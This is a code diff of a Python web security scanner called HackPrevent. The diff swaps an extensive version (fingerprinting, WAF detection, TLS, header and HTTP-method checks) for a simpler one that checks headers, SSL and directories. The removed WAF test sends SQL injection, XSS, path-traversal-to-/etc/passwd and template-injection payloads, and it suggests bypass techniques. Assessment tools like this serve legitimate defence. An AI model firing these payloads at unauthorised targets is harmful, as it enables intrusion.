-                frameworks.append(framework)
-        
-        # Check for framework-specific headers
-        if 'x-powered-by' in headers:
-            powered_by = headers['x-powered-by']
-            if 'asp.net' in powered_by:
-                frameworks.append('asp.net')
-            elif 'php' in powered_by:
-                frameworks.append('php')
-        
-        return frameworks
-    
-    def detect_languages(self, response):
-        """Detect programming languages"""
-        languages = []
-        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
-        content = response.text.lower()
-        
-        # Check headers
-        if 'x-powered-by' in headers:
-            powered_by = headers['x-powered-by']
-            if 'php' in powered_by:
-                languages.append(f"PHP ({powered_by})")
-            elif 'asp.net' in powered_by:
-                languages.append("ASP.NET")
-        
-        # Check file extensions in URLs
-        if '.php' in content:
-            languages.append('PHP')
-        if '.asp' in content or '.aspx' in content:
-            languages.append('ASP.NET')
-        if '.jsp' in content:
-            languages.append('Java (JSP)')
-        if '.py' in content:
-            languages.append('Python')
-        
-        return languages
-    
-    def detect_databases(self, response):
-        """Detect database technologies"""
-        databases = []
-        content = response.text.lower()
-        
-        db_signatures = {
-            'mysql': ['mysql', 'phpmyadmin'],
-            'postgresql': ['postgresql', 'postgres'],
-            'mongodb': ['mongodb', 'mongo'],
-            'oracle': ['oracle', 'ora-'],
-            'mssql': ['microsoft sql server', 'mssql'],
-            'sqlite': ['sqlite'],
-            'redis': ['redis'],
-            'elasticsearch': ['elasticsearch', 'elastic']
-        }
-        
-        for db, signatures in db_signatures.items():
-            if any(sig in content for sig in signatures):
-                databases.append(db)
-        
-        return databases
-    
-    def detect_cdn(self, response):
-        """Detect CDN services"""
-        cdns = []
-        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
-        
-        cdn_signatures = {
-            'cloudflare': ['cf-ray', 'cloudflare'],
-            'aws_cloudfront': ['cloudfront', 'x-amz-cf-id'],
-            'fastly': ['fastly'],
-            'akamai': ['akamai'],
-            'maxcdn': ['maxcdn'],
-            'keycdn': ['keycdn'],
-            'jsdelivr': ['jsdelivr'],
-            'cdnjs': ['cdnjs']
-        }
-        
-        for cdn, signatures in cdn_signatures.items():
-            if any(sig in str(headers.values()).lower() for sig in signatures):
-                cdns.append(cdn)
-        
-        return cdns
-    
-    def detect_analytics(self, response):
-        """Detect analytics and tracking services"""
-        analytics = []
-        content = response.text.lower()
-        
-        analytics_signatures = {
-            'google_analytics': ['google-analytics', 'gtag', 'ga('],
-            'facebook_pixel': ['facebook pixel', 'fbq('],
-            'hotjar': ['hotjar'],
-            'mixpanel': ['mixpanel'],
-            'segment': ['segment'],
-            'adobe_analytics': ['adobe analytics', 's_code'],
-            'piwik': ['piwik', 'matomo'],
-            'yandex_metrica': ['yandex.metrica']
-        }
-        
-        for service, signatures in analytics_signatures.items():
-            if any(sig in content for sig in signatures):
-                analytics.append(service)
-        
-        return analytics
-    
-    def detect_security_products(self, response):
-        """Detect security products and WAFs"""
-        security_products = []
-        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
-        
-        waf_signatures = {
-            'cloudflare': ['cf-ray', 'cloudflare'],
-            'akamai': ['akamai'],
-            'incapsula': ['incap_ses', 'incapsula'],
-            'sucuri': ['sucuri', 'x-sucuri'],
-            'mod_security': ['mod_security'],
-            'barracuda': ['barracuda'],
-            'f5_big_ip': ['f5-bigip', 'bigip'],
-            'aws_waf': ['awswaf'],
-            'fortinet': ['fortinet']
-        }
-        
-        for waf, signatures in waf_signatures.items():
-            if any(sig in str(headers.values()).lower() for sig in signatures):
-                security_products.append(waf)
-                self.waf_detected = True
-                self.waf_type = waf
-        
-        return security_products
-    
-    def waf_detection(self):
-        """Advanced WAF detection and bypass testing"""
-        print(f"{Fore.CYAN}🛡️  Testing for Web Application Firewall...{Style.RESET_ALL}")
-        
-        waf_payloads = [
-            "' OR 1=1--",
-            "<script>alert('test')</script>",
-            "../../../../etc/passwd",
-            "'; DROP TABLE users;--",
-            "{{7*7}}",
-            "${7*7}",
-            "<img src=x onerror=alert(1)>"
-        ]
-        
-        waf_detected = False
-        waf_responses = []
-        
-        for payload in waf_payloads:
-            try:
-                self.rotate_user_agent()
-                test_url = f"{self.target_url}?test={quote(payload)}"
-                response = self.session.get(test_url, timeout=10, verify=False)
+                url = urljoin(self.target_url, path)
+                response = self.session.get(url, timeout=5, allow_redirects=False)
                 
-                # Check for WAF indicators
-                waf_indicators = [
-                    'blocked', 'forbidden', 'not acceptable', 'security',
-                    'firewall', 'protection', 'cloudflare', 'incapsula',
-                    'sucuri', 'mod_security', 'blocked by', 'access denied'
-                ]
-                
-                response_text = response.text.lower()
-                if (response.status_code in [403, 406, 429, 501, 503] or 
-                    any(indicator in response_text for indicator in waf_indicators)):
-                    waf_detected = True
-                    waf_responses.append({
-                        'payload': payload,
-                        'status_code': response.status_code,
-                        'response_length': len(response.content)
+                if response.status_code in [200, 301, 302, 403]:
+                    found_paths.append({
+                        'path': path,
+                        'status': response.status_code,
+                        'size': len(response.content)
                     })
-                
+                    
+                    if response.status_code == 200:
+                        print(f"{Fore.GREEN}✅ Found: {path} (Status: {response.status_code})")
+                        
+                        # Check for sensitive content
+                        if path in ['/admin', '/administrator', '/wp-admin', '/login']:
+                            self.log_vulnerability("Sensitive Directory", "MEDIUM",
+                                                 f"Administrative interface accessible at {path}",
+                                                 f"Status: {response.status_code}",
+                                                 "Restrict access to administrative interfaces")
+                    else:
+                        print(f"{Fore.CYAN}ℹ️  {path}: {response.status_code}")
+                        
             except Exception:
-                pass
+                continue
         
-        if waf_detected:
-            self.waf_detected = True
-            self.log_vulnerability("Security Controls", "WAF Detection", "INFO",
-                                 "Web Application Firewall detected",
-                                 f"WAF responses: {len(waf_responses)}",
-                                 "Implement bypass techniques for comprehensive testing")
-            print(f"  🛡️  WAF detected - {len(waf_responses)} blocked requests")
-        else:
-            print(f"  ❌ No WAF detected")
-        
-        self.scan_results['reconnaissance']['waf_detection'] = {
-            'detected': waf_detected,
-            'blocked_requests': len(waf_responses),
-            'responses': waf_responses
-        }
+        print(f"{Fore.GREEN}📋 Found {len(found_paths)} accessible paths")
+        return found_paths
     
-    def comprehensive_infrastructure_analysis(self):
-        """Enhanced infrastructure security analysis"""
-        print(f"\n{Fore.BLUE}🏗️  Comprehensive Infrastructure Analysis...{Style.RESET_ALL}")
+    def basic_ssl_analysis(self):
+        """Basic SSL analysis with error handling"""
+        print(f"\n{Fore.BLUE}🔒 Basic SSL/TLS analysis...{Style.RESET_ALL}")
         
-        # Enhanced SSL/TLS Analysis
-        self.advanced_ssl_analysis()
-        
-        # Security Headers Analysis
-        self.comprehensive_security_headers()
-        
-        # Server Analysis
-        self.server_security_analysis()
-        
-        # Port Scanning (if aggressive mode)
-        if self.aggressive:
-            self.port_scanning()
-    
-    def advanced_ssl_analysis(self):
-        """Advanced SSL/TLS security analysis"""
-        print(f"{Fore.CYAN}🔒 Advanced SSL/TLS analysis...{Style.RESET_ALL}")
+        if not self.target_url.startswith('https://'):
+            self.log_vulnerability("SSL Configuration", "HIGH", 
+                                 "Site not using HTTPS",
+                                 "URL scheme: HTTP",
+                                 "Implement HTTPS with valid SSL certificate")
+            return
         
         try:
             hostname = urlparse(self.target_url).netloc
             port = 443
             
-            # Create SSL context for testing
             context = ssl.create_default_context()
             context.check_hostname = False
             context.verify_mode = ssl.CERT_NONE
-            
-            # Test different SSL/TLS versions
-            ssl_versions = [
-                ('SSLv2', ssl.PROTOCOL_SSLv23),
-                ('SSLv3', ssl.PROTOCOL_SSLv23),
-                ('TLSv1.0', ssl.PROTOCOL_TLSv1),
-                ('TLSv1.1', ssl.PROTOCOL_TLSv1_1),
-                ('TLSv1.2', ssl.PROTOCOL_TLSv1_2)
-            ]
-            
-            supported_versions = []
             
             with socket.create_connection((hostname, port), timeout=10) as sock:
                 with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                     cert = ssock.getpeercert()
                     protocol = ssock.version()
-                    cipher = ssock.cipher()
                     
-                    # Certificate analysis
                     if cert:
-                        cert_analysis = self.analyze_certificate(cert)
+                        expiry_date = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
+                        days_until_expiry = (expiry_date - datetime.now()).days
                         
-                        # Check certificate chain
-                        chain_issues = self.check_certificate_chain(hostname, port)
+                        print(f"{Fore.GREEN}✅ SSL Certificate valid")
+                        print(f"{Fore.GREEN}✅ Protocol: {protocol}")
+                        print(f"{Fore.GREEN}✅ Expires: {cert['notAfter']} ({days_until_expiry} days)")
                         
-                        # Check for weak cipher suites
-                        weak_ciphers = self.check_weak_ciphers(cipher)
+                        if days_until_expiry < 30:
+                            severity = "HIGH" if days_until_expiry < 7 else "MEDIUM"
+                            self.log_vulnerability("SSL Certificate", severity,
+                                                 f"Certificate expires in {days_until_expiry} days",
+                                                 f"Expires: {cert['notAfter']}",
+                                                 "Renew SSL certificate")
                         
-                        ssl_results = {
-                            'protocol': protocol,
-                            'cipher_suite': cipher,
-                            'certificate_analysis': cert_analysis,
-                            'chain_issues': chain_issues,
-                            'weak_ciphers': weak_ciphers,
-                            'supported_versions': supported_versions
-                        }
-                        
-                        self.scan_results['infrastructure_analysis']['ssl_analysis'] = ssl_results
-                        
-                        print(f"  ✅ Protocol: {protocol}")
-                        print(f"  ✅ Cipher: {cipher[0] if cipher else 'Unknown'}")
-                        print(f"  📋 Certificate expires: {cert_analysis.get('expiry_date', 'Unknown')}")
-        
+                        if protocol in ['TLSv1', 'TLSv1.1']:
+                            self.log_vulnerability("SSL Protocol", "MEDIUM",
+                                                 f"Weak TLS protocol: {protocol}",
+                                                 f"Current: {protocol}",
+                                                 "Upgrade to TLS 1.2+")
+            
         except Exception as e:
-            self.log_vulnerability("SSL Analysis", "SSL Configuration", "LOW", 
-                                 f"SSL analysis failed: {str(e)}")
+            self.log_vulnerability("SSL Analysis", "LOW", f"SSL analysis failed: {str(e)}")
     
-    def analyze_certificate(self, cert):
-        """Detailed certificate analysis"""
-        analysis = {}
+    def generate_report(self):
+        """Generate comprehensive report"""
+        print(f"\n{Fore.YELLOW}📊 Generating security report...{Style.RESET_ALL}")
         
+        # Calculate risk metrics
+        severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
+        severity_weights = {'CRITICAL': 25, 'HIGH': 10, 'MEDIUM': 5, 'LOW': 1, 'INFO': 0}
+        
+        total_risk_score = 0
+        for vuln in self.vulnerabilities:
+            severity = vuln['severity']
+            severity_counts[severity] += 1
+            total_risk_score += severity_weights.get(severity, 0)
+        
+        # Determine risk level
+        if total_risk_score >= 50:
+            risk_level = "HIGH"
+            risk_color = Fore.RED
+            risk_emoji = "🔴"
+        elif total_risk_score >= 20:
+            risk_level = "MEDIUM"
+            risk_color = Fore.YELLOW
+            risk_emoji = "🟡"
+        elif total_risk_score >= 5:
+            risk_level = "LOW"
+            risk_color = Fore.CYAN
+            risk_emoji = "🔵"
+        else:
+            risk_level = "MINIMAL"
+            risk_color = Fore.GREEN
+            risk_emoji = "🟢"
+        
+        # Update scan results
+        self.scan_results.update({
+            'vulnerabilities': self.vulnerabilities,
+            'summary': {
+                'total_vulnerabilities': len(self.vulnerabilities),
+                'risk_score': total_risk_score,
+                'risk_level': risk_level,
+                'severity_breakdown': severity_counts
+            }
+        })
+        
+        # Generate report files
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        domain_clean = self.domain.replace('.', '_')
+        report_filename = f"hackprevent_scan_{domain_clean}_{timestamp}.json"
+        
+        # Save JSON report
+        with open(report_filename, 'w') as f:
+            json.dump(self.scan_results, f, indent=2, default=str)
+        
+        # Print summary
+        print(f"\n{Fore.CYAN}╭{'─' * 70}╮")
+        print(f"{Fore.CYAN}│{Fore.YELLOW}  🛡️  HACKPREVENT SCAN RESULTS{' ' * 29}│")
+        print(f"{Fore.CYAN}├{'─' * 70}┤")
+        print(f"{Fore.CYAN}│{Fore.WHITE}  🎯 Target: {self.target_url:<50}│")
+        print(f"{Fore.CYAN}│{Fore.WHITE}  📅 Completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<46}│")
+        print(f"{Fore.CYAN}│{' ' * 70}│")
+        print(f"{Fore.CYAN}│{risk_color}  {risk_emoji} Risk Level: {risk_level} (Score: {total_risk_score}){' ' * (47-len(risk_level)-len(str(total_risk_score)))}│")
+        print(f"{Fore.CYAN}│{' ' * 70}│")
+        print(f"{Fore.CYAN}│{Fore.RED}  🔴 Critical: {severity_counts['CRITICAL']:<3} 🟠 High: {severity_counts['HIGH']:<3} 🟡 Medium: {severity_counts['MEDIUM']:<3} 🔵 Low: {severity_counts['LOW']:<8}│")
+        print(f"{Fore.CYAN}│{' ' * 70}│")
+        print(f"{Fore.CYAN}│{Fore.WHITE}  📄 Report saved: {report_filename:<42}│")
+        print(f"{Fore.CYAN}╰{'─' * 70}╯{Style.RESET_ALL}")
+        
+        return report_filename
+    
+    def run_scan(self):
+        """Execute comprehensive security scan"""
         try:
-            # Basic certificate info
-            analysis['subject'] = dict(x[0] for x in cert.get('subject', []))
-            analysis['issuer'] = dict(x[0] for x in cert.get('issuer', []))
-            analysis['serial_number'] = cert.get('serialNumber', 'Unknown')
-            analysis['version'] = cert.get('version', 'Unknown')
+            self.print_banner()
             
-            # Validity period
-            not_before = cert.get('notBefore')
-            not_after = cert.get('notAfter')
+            print(f"{Fore.GREEN}🚀 Starting security assessment...{Style.RESET_ALL}")
             
-            if not_after:
-                expiry_date = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
-                analysis['expiry_date'] = not_after
-                analysis['days_until_expiry'] = (expiry_date - datetime.now()).days
-                
-                # Check for expiration warnings
-                if analysis['days_until_expiry'] < 30:
-                    severity = "HIGH" if analysis['days_until_expiry'] < 7 else "MEDIUM"
-                    self.log_vulnerability("SSL Certificate", "Certificate Expiration", severity,
-                                         f"Certificate expires in {analysis['days_until_expiry']} days",
-                                         f"Expires: {not_after}",
-                                         "Renew SSL certificate before expiration",
-                                         "", "A6:2017-Security Misconfiguration")
+            # Pre-scan connectivity check
+            if not self.check_connectivity():
+                print(f"{Fore.RED}❌ Cannot proceed - target unreachable{Style.RESET_ALL}")
+                return False
             
-            # Subject Alternative Names
-            san_list = []
-            for ext in cert.get('extensions', []):
-                if 'subjectAltName' in str(ext):
-                    san_list = [item.strip() for item in str(ext).split(',')]
-                    break
-            analysis['subject_alt_names'] = san_list
-            
-            # Check for weak signature algorithm
-            sig_algorithm = cert.get('signatureAlgorithm', '').lower()
-            if 'sha1' in sig_algorithm or 'md5' in sig_algorithm:
-                self.log_vulnerability("SSL Certificate", "Weak Signature Algorithm", "MEDIUM",
-                                     f"Certificate uses weak signature algorithm: {sig_algorithm}",
-                                     f"Algorithm: {sig_algorithm}",
-                                     "Use SHA-256 or stronger signature algorithm",
-                                     "", "A6:2017-Security Misconfiguration")
-            
-            analysis['signature_algorithm'] = sig_algorithm
-            
-        except Exception as e:
-            analysis['error'] = str(e)
-        
-        return analysis
-    
-    def check_certificate_chain(self, hostname, port):
-        """Check certificate chain for issues"""
-        issues = []
-        
-        try:
-            # Test with verification enabled
-            context = ssl.create_default_context()
-            with socket.create_connection((hostname, port), timeout=10) as sock:
-                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
-                    peer_cert_chain = ssock.getpeercert_chain()
-                    if peer_cert_chain and len(peer_cert_chain) < 2:
-                        issues.append("Incomplete certificate chain")
-        except ssl.SSLError as e:
-            if "certificate verify failed" in str(e):
-                issues.append("Certificate verification failed")
-            issues.append(f"SSL Error: {str(e)}")
-        except Exception as e:
-            issues.append(f"Chain validation error: {str(e)}")
-        
-        return issues
-    
-    def check_weak_ciphers(self, cipher):
-        """Check for weak cipher suites"""
-        weak_ciphers = []
-        
-        if cipher:
-            cipher_name = cipher[0].upper()
-            
-            # Weak cipher patterns
-            weak_patterns = [
-                'RC4', 'DES', '3DES', 'MD5', 'SHA1', 'NULL', 'EXPORT',
-                'ADH', 'AECDH', 'LOW', 'MEDIUM'
+            # Run scan modules
+            scan_modules = [
+                ("Security Headers Analysis", self.security_headers_analysis),
+                ("Basic SSL Analysis", self.basic_ssl_analysis),
+                ("Directory Enumeration", self.basic_directory_scan)
             ]
             
-            for pattern in weak_patterns:
-                if pattern in cipher_name:
-                    weak_ciphers.append(pattern)
-                    self.log_vulnerability("SSL Configuration", "Weak Cipher Suite", "MEDIUM",
-                                         f"Weak cipher suite detected: {cipher_name}",
-                                         f"Cipher: {cipher_name}",
-                                         "Disable weak cipher suites and use strong encryption")
-        
-        return weak_ciphers
-    
-    def comprehensive_security_headers(self):
-        """Comprehensive security headers analysis"""
-        print(f"{Fore.CYAN}🛡️  Comprehensive security headers analysis...{Style.RESET_ALL}")
-        
-        try:
-            self.rotate_user_agent()
-            response = self.session.get(self.target_url, timeout=15, verify=False)
-            headers = {k.lower(): v for k, v in response.headers.items()}
+            for module_name, module_func in scan_modules:
+                try:
+                    print(f"\n{Fore.BLUE}🔍 Running {module_name}...{Style.RESET_ALL}")
+                    module_func()
+                    time.sleep(1)  # Rate limiting
+                except Exception as e:
+                    print(f"{Fore.RED}❌ Error in {module_name}: {str(e)}{Style.RESET_ALL}")
+                    self.log_vulnerability("Scan Error", "LOW", f"Error in {module_name}: {str(e)}")
             
-            # Extended security headers check
-            security_headers = {
-                'strict-transport-security': {
-                    'description': 'HTTP Strict Transport Security',
-                    'severity': 'HIGH',
-                    'recommendation': 'Implement HSTS with max-age >= 31536000',
-                    'owasp': 'A6:2017-Security Misconfiguration'
-                },
-                'content-security-policy': {
-                    'description': 'Content Security Policy',
-                    'severity': 'HIGH',
-                    'recommendation': 'Implement strict CSP to prevent XSS and injection attacks',
-                    'owasp': 'A7:2017-Cross-Site Scripting (XSS)'
-                },
-                'x-frame-options': {
-                    'description': 'Clickjacking protection',
-                    'severity': 'MEDIUM',
-                    'recommendation': 'Set X-Frame-Options to DENY or SAMEORIGIN',
-                    'owasp': 'A6:2017-Security Misconfiguration'
-                },
-                'x-content-type-options': {
-                    'description': 'MIME type sniffing protection',
-                    'severity': 'MEDIUM',
-                    'recommendation': 'Set X-Content-Type-Options to nosniff',
-                    'owasp': 'A6:2017-Security Misconfiguration'
-                },
-                'x-xss-protection': {
-                    'description': 'XSS protection filter',
-                    'severity': 'MEDIUM',
-                    'recommendation': 'Set X-XSS-Protection to 1; mode=block',
-                    'owasp': 'A7:2017-Cross-Site Scripting (XSS)'
-                },
-                'referrer-policy': {
-                    'description': 'Referrer information control',
-                    'severity': 'LOW',
-                    'recommendation': 'Implement strict referrer policy',
-                    'owasp': 'A3:2017-Sensitive Data Exposure'
-                },
-                'permissions-policy': {
-                    'description': 'Feature policy control',
-                    'severity': 'LOW',
-                    'recommendation': 'Implement permissions policy for enhanced security',
-                    'owasp': 'A6:2017-Security Misconfiguration'
-                },
-                'expect-ct': {
-                    'description': 'Certificate Transparency',
-                    'severity': 'LOW',
-                    'recommendation': 'Implement Expect-CT header',
-                    'owasp': 'A6:2017-Security Misconfiguration'
-                },
-                'cross-origin-embedder-policy': {
-                    'description': 'Cross-origin isolation',
-                    'severity': 'LOW',
-                    'recommendation': 'Implement COEP for enhanced security',
-                    'owasp': 'A6:2017-Security Misconfiguration'
-                },
-                'cross-origin-opener-policy': {
-                    'description': 'Cross-origin opener policy',
-                    'severity': 'LOW',
-                    'recommendation': 'Implement COOP for enhanced security',
-                    'owasp': 'A6:2017-Security Misconfiguration'
-                }
-            }
+            # Generate report
+            report_file = self.generate_report()
             
-            present_headers = {}
-            missing_headers = []
-            weak_headers = []
+            print(f"\n{Fore.GREEN}✅ Security assessment completed!")
+            print(f"{Fore.GREEN}📊 Found {len(self.vulnerabilities)} issues")
+            print(f"{Fore.GREEN}📁 Report saved: {report_file}{Style.RESET_ALL}")
             
-            for header, info in security_headers.items():
-                if header in headers:
-                    header_value = headers[header]
-                    present_headers[header] = header_value
-                    
-                    # Analyze header strength
-                    weakness = self.analyze_header_strength(header, header_value)
-                    if weakness:
-                        weak_headers.append({
-                            'header': header,
-                            'value': header_value,
-                            'weakness': weakness
-                        })
-                        self.log_vulnerability("Security Headers", "Weak Header Configuration", "MEDIUM",
-                                             f"Weak {header} configuration: {weakness}",
-                                             f"Current value: {header_value}",
-                                             info['recommendation'],
-                                             "", info['owasp'])
-                    
-                    print(f"  ✅ {header}: {header_value[:60]}...")
-                else:
-                    missing_headers.append(header)
-                    self.log_vulnerability("Security Headers", "Missing Security Header", info['severity'],
-                                         f"Missing {header} header",
-                                         f"Header: {header}",
-                                         info['recommendation'],
-                                         "", info['owasp'])
+            return True
             
-            # Calculate security score
-            total_headers = len(security_headers)
-            present_count = len(present_headers)
-            security_score = (present_count / total_headers) * 100
-            
-            self.scan_results['infrastructure_analysis']['security_headers'] = {
-                'present_headers': present_headers,
-                'missing_headers': missing_headers,
-                'weak_headers': weak_headers,
-                'security_score': round(security_score, 1),
-                'total_headers_checked': total_headers
-            }
-            
-            print(f"  📊 Security Headers Score: {security_score:.1f}% ({present_count}/{total_headers})")
-            
+        except KeyboardInterrupt:
+            print(f"\n{Fore.YELLOW}⚠️  Scan interrupted by user{Style.RESET_ALL}")
+            return False
         except Exception as e:
-            self.log_vulnerability("Header Analysis", "Security Headers Analysis", "LOW",
-                                 f"Header analysis failed: {str(e)}")
+            print(f"\n{Fore.RED}❌ Unexpected error: {str(e)}")
+            traceback.print_exc()
+            return False
+
+def main():
+    """Main function with argument parsing"""
+    parser = argparse.ArgumentParser(
+        description='🛡️  HackPrevent Professional Web Security Scanner - Fixed Version',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  python3 hackprevent_fixed_scanner.py -u https://example.com
+  python3 hackprevent_fixed_scanner.py -u https://testsite.com -t 20
+  
+💼 Professional cybersecurity tool by Javier Bogado - HackPrevent
+        """
+    )
     
-    def analyze_header_strength(self, header, value):
-        """Analyze security header strength"""
-        value_lower = value.lower()
-        
-        if header == 'strict-transport-security':
-            if 'max-age=' not in value_lower:
-                return "Missing max-age directive"
-            # Extract max-age value
-            import re
-            max_age_match = re.search(r'max-age=(\d+)', value_lower)
-            if max_age_match:
-                max_age = int(max_age_match.group(1))
-                if max_age < 31536000:  # Less than 1 year
-                    return f"max-age too low: {max_age} (recommended: >= 31536000)"
-            if 'includesubdomains' not in value_lower:
-                return "Missing includeSubDomains directive"
-        
-        elif header == 'content-security-policy':
-            if 'unsafe-inline' in value_lower:
-                return "Contains unsafe-inline directive"
-            if 'unsafe-eval' in value_lower:
-                return "Contains unsafe-eval directive"
-            if '*' in value and 'data:' not in value_lower:
-                return "Uses wildcard (*) source"
-        
-        elif header == 'x-frame-options':
-            if value_lower not in ['deny', 'sameorigin']:
-                return f"Weak value: {value} (recommended: DENY or SAMEORIGIN)"
-        
-        elif header == 'x-content-type-options':
-            if value_lower != 'nosniff':
-                return f"Weak value: {value} (recommended: nosniff)"
-        
-        elif header == 'x-xss-protection':
-            if '1; mode=block' not in value_lower:
-                return f"Weak value: {value} (recommended: 1; mode=block)"
-        
-        return None
+    parser.add_argument('-u', '--url', required=True,
+                       help='🎯 Target URL to scan')
+    parser.add_argument('-t', '--threads', type=int, default=10,
+                       help='🔧 Number of threads (default: 10)')
     
-    def server_security_analysis(self):
-        """Comprehensive server security analysis"""
-        print(f"{Fore.CYAN}🖥️  Server security analysis...{Style.RESET_ALL}")
-        
-        try:
-            self.rotate_user_agent()
-            response = self.session.get(self.target_url, timeout=15, verify=False)
-            
-            server_analysis = {
-                'server_banner': self.analyze_server_banner(response),
-                'information_disclosure': self.check_information_disclosure(response),
-                'http_methods': self.test_http_methods(),
-                'server_status_pages': self.check_server_status_pages(),
-                'backup_files': self.check_backup_files()
-            }
-            
-            self.scan_results['infrastructure_analysis']['server_analysis'] = server_analysis
-            
-        except Exception as e:
-            self.log_vulnerability("Server Analysis", "Server Security Analysis", "LOW",
-                                 f"Server analysis failed: {str(e)}")
+    args = parser.parse_args()
     
-    def analyze_server_banner(self, response):
-        """Analyze server banner for information disclosure"""
-        server_header = response.headers.get('Server', '')
-        powered_by = response.headers.get('X-Powered-By', '')
-        
-        analysis = {
-            'server': server_header,
-            'powered_by': powered_by,
-            'version_disclosure': False,
-            'detailed_info': []
-        }
-        
-        # Check for version disclosure
-        version_patterns = [
-            r'\d+\.\d+\.\d+',  # Version numbers
-            r'Apache/[\d\.]+',
-            r'nginx/[\d\.]+',
-            r'Microsoft-IIS/[\d\.]+',
-            r'PHP/[\d\.]+',
-            r'OpenSSL/[\d\.]+[a-z]?'
-        ]
-        
-        for pattern in version_patterns:
-            if re.search(pattern, server_header + powered_by):
-                analysis['version_disclosure'] = True
-                analysis['detailed_info'].append(f"Version information disclosed in headers")
-                
-                self.log_vulnerability("Information Disclosure", "Server Version Disclosure", "LOW",
-                                     "Server version information disclosed in headers",
-                                     f"Server: {server_header}, X-Powered-By: {powered_by}",
-                                     "Configure server to hide version information",
-                                     "", "A6:2017-Security Misconfiguration")
-                break
-        
-        print(f"  🖥️  Server: {server_header}")
-        if powered_by:
-            print(f"  ⚡ Powered by: {powered_by}")
-        
-        return analysis
+    # Validate URL
+    if not args.url.startswith(('http://', 'https://')):
+        print(f"{Fore.RED}❌ Error: URL must start with http:// or https://{Style.RESET_ALL}")
+        sys.exit(1)
     
-    def check_information_disclosure(self, response):
-        """Check for various information disclosure issues"""
-        disclosure_issues = []
-        headers = response.headers
-        content = response.text
+    try:
+        # Create and run scanner
+        scanner = HackPreventScanner(args.url, args.threads)
+        success = scanner.run_scan()
         
-        # Check for sensitive headers
-        sensitive_headers = [
-            'X-Debug-Token', 'X-Debug-Token-Link', 'X-Debug-Mode',
-            'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version',
-            'X-Generator', 'X-Drupal-Cache', 'X-Varnish'
-        ]
+        if success:
+            print(f"\n{Fore.GREEN}🎉 Scan completed successfully!{Style.RESET_ALL}")
+        else:
+            print(f"\n{Fore.RED}❌ Scan failed{Style.RESET_ALL}")
+            sys.exit(1)
         
-        for header in sensitive_headers:
-            if header in headers:
-                disclosure_issues.append(f"Sensitive header disclosed: {header}")
-                self.log_vulnerability("Information Disclosure", "Sensitive Header Disclosure", "LOW",
-                                     f"Sensitive header disclosed: {header}",
-                                     f"Value: {headers[header]}",
-                                     f"Remove or obfuscate {header} header")
-        
-        # Check for stack traces and error messages
-        error_patterns = [
-            r'fatal error', r'warning:', r'notice:', r'parse error',
-            r'mysql_', r'ora-\d+', r'microsoft ole db provider',
-            r'stack trace', r'exception', r'error in', r'line \d+',
-            r'traceback', r'call stack'
-        ]
-        
-        for pattern in error_patterns:
-            if re.search(pattern, content, re.IGNORECASE):
-                disclosure_issues.append(f"Error message pattern found: {pattern}")
-                self.log_vulnerability("Information Disclosure", "Error Message Disclosure", "MEDIUM",
-                                     f"Error messages disclosed in response",
-                                     f"Pattern: {pattern}",
-                                     "Implement custom error pages and proper error handling",
-                                     "", "A6:2017-Security Misconfiguration")
-                break
-        
-        return disclosure_issues
-    
-    def test_http_methods(self):
-        """Test HTTP methods for security issues"""
-        print(f"  🔧 Testing HTTP methods...")
-        
-        methods_to_test = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE', 'CONNECT']
-        allowed_methods = []
-        dangerous_methods = []
-        
-        for method in methods_to_test:
-            try:
-                self.rotate_user_agent()
-                response = self.session.request(method, self.target_url, timeout=10, verify=False)
-                
-                if response.status_code not in [405, 501]:  # Method not allowed, Not implemented
-                    allowed_methods.append(method)
-                    
-                    # Check for dangerous methods
-                    if method in ['PUT', 'DELETE', 'PATCH', 'TRACE', 'CONNECT']:
-                        dangerous_methods.append(method)
-                        severity = "HIGH" if method in ['PUT', 'DELETE'] else "MEDIUM"
-                        self.log_vulnerability("HTTP Methods", "Dangerous HTTP Method", severity,
-                                             f"Dangerous HTTP method {method} is allowed",
-                                             f"Status code: {response.status_code}",
-                                             f"Restrict {method} method access or disable if not needed",
-                                             "", "A6:2017-Security Misconfiguration")
-                
-            except Exception:
-                pass
-        
-        print(f"    ✅ Allowed methods: {', '.join(allowed_methods)}")
-        if dangerous_methods:
-            print(f"    ⚠️  Dangerous methods: {', '.join(dangerous_methods)}")
-        
-        return {
-            'allowed_methods': allowed_methods,
-            'dangerous_methods': dangerous_methods
-        }
-    
-    def check_server_status_pages(self):
-        """Check for accessible server status pages"""
-        status_pages = [
-            '/server-status', '/server-info', '/status', '/info',
-            '/nginx_status', '/php_info', '/phpinfo.php', '/info.php',
-            '/test.php', '/status.php', '/health', '/health-check',
-            '/metrics', '/stats', '/statistics', '/monitor'
-        ]
-        
-        accessible_pages = []
+    except Exception as e:
+        print(f"{Fore.RED}❌ Fatal error: {str(e)}{Style.RESET_ALL}")
+        traceback.print_exc()
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
